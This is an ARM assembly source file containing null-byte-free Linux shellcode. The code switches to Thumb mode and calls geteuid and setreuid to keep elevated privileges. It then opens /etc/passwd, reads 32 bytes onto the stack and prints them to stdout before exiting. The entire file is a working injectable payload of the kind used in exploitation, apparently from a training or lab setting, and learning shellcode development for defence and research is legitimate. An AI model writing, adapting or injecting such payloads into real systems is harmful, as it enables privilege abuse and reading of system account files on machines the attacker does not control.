.section .text
.global _start

_start:

	@ thumbmode
	.code 32
	add r6, pc, #1
	bx r6

	.code 16

	@ uid_t geteuid(void)
	@ r7: 49

	mov r7, #49	  	@ syscall number 49 (geteuid)
	svc 1			      @ execute syscall (no null bytes)
	
	@ int setreuid(uid_t ruid, uid_t euid)
	mov r1, r0
	mov r7, #70		  @ syscall number 70 (setreuid)
	svc 1

	@ int open(const char *pathname, int flags)
	@ r0: *path, r1: 0
	@ r7: 5

	sub r4,r4,r4		@ r4 = 0
	mov r1, r4      @ int flags =  0
	mov r0, pc
	add r0, #30     @ 2 (bytes) * 15 (instructions before .ascii)
	mov r7, #5      @ syscall number 5 (open)
	svc 1

	@ ssize_t read(int fd, void *buf, size_t count)
	@ r0 = fd 
	
	mov r1, sp		  @ read file to stack
	mov r2, #32		  @ size_t count =  32
	mov r7, #3		  @ syscall number 3 (read)
	svc 1
	@ r0 -> number of bytes read

	@ ssize_t write(int fd, const void *buf, size_t count); 

	mov r2, r0      @ count = return value of read
	mov r1, sp      @ write from the stack
	mov r0, #1	    @ int fd = stdout
	mov r7, #4      @ syscall number 4 (write) 
	svc 1 

	@ void exit(int status)         

	sub r4, r4, r4  @ r4 = 0 (no null bytes)
	mov r0, r4		  @ int status = 0
	mov r7, $0x1   	@ syscall number 1 (exit)
	svc 1

	@ file path to open
	.ascii "/etc/passwd"
